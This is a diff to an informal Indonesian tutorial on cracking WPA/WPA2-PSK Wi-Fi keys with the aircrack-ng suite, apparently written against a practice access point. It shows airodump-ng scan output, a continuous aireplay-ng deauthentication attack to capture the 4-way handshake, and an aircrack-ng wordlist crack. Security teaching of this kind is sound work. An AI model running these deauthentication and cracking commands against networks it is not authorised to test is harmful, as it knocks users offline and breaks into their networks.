@@ -30,6 +30,30 @@ sudo airmon-ng start [interface]
 sudo airodump-ng [interface]
 ```
 
+Output:
+
+```
+ CH 11 ][ Elapsed: 0 s ][ 2026-01-23 13:32                                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                                       
+                                                                                                                                                                                                                                           
+ 84:16:F9:FE:64:68  -26   0       15        0    0  11  130   WPA2 CCMP   PSK  LATIHAN                                                                                                                                                     
+                                                                                                                                                                                                                                           
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                                                                                                         
+                                                                                                                                                                                                                                           
+ 84:16:F9:FE:64:68  4A:F2:3B:A2:12:29  -30    0 - 1      0        5
+```
+
+Catet:
+- `ESSID`: Nama Wi-Fi
+- `BSSID`: MAC address AP
+- `CH`: Channel AP
+- `STATION`: MAC address client
+- `PWR`: Kekuatan sinyal AP dalam satuan decibel-milliwatt (`dBm`)
+
+> [!NOTE]
+> Pastiin `PWR` AP target kaga di atas `-60` powernya. Kalo di atas, berarti sinyal AP target lemah, jadi proses capture 4-way handshake bakal susah, EAPOL frame yang didapet bisa gagal atau gak lengkap, sama serangan deauth bakal jadi lama prosesnya atau malahan gagal.
+
 #### 3. Capture Handshake
 
 ```
@@ -42,7 +66,7 @@ sudo airodump-ng -N [essid] -d [bssid] -c [channel] -w [output] [interface]
 sudo aireplay-ng -0 0 -a [bssid] -c [mac_client] [interface]
 ```
 
-Serangan ini dipake buat mutusin koneksi client sama AP target. Pas client keputus, dia bakal nyoba konek ulang, dan di momen itu bakal muncul handshake yang bisa ditangkep buat dipake dalam serangan lanjutan.
+Serangan ini dipake buat mutusin koneksi client dari AP target. Pas client keputus, dia bakal nyoba konek ulang, dan di momen itu bakal muncul 4-way handshake yang bisa ditangkep dan bisa dipake buat crack kunci WPA/WPA2-PSK.
 
 #### 5. Monitoring Handshake
 
@@ -58,9 +82,9 @@ CH 11 ][ Elapsed: 6 s ][ 2026-01-20 13:03 ][ WPA handshake: 84:16:F9:FE:64:68
  84:16:F9:FE:64:68  4A:F2:3B:A2:12:29  -33    1e- 1e     0       14  EAPOL
 ```
 
-Tungguin di kolom pojok kanan atas sampai nongol `WPA handshake: 84:16:F9:FE:64:68`. Kalo udah nongol teken `CTRL+C`.
+Tungguin di kolom pojok kanan atas sampai nongol `WPA handshake: [bssid]`. Kalo udah nongol teken `CTRL+C`.
 
-#### 6. Crack WPA/WPA2-PSK
+#### 6. Crack Kunci WPA/WPA2-PSK
 
 ```
 aircrack-ng -a 2 -e [essid] -b [bssid] -l [output] [file_capture] -w [wordlist]
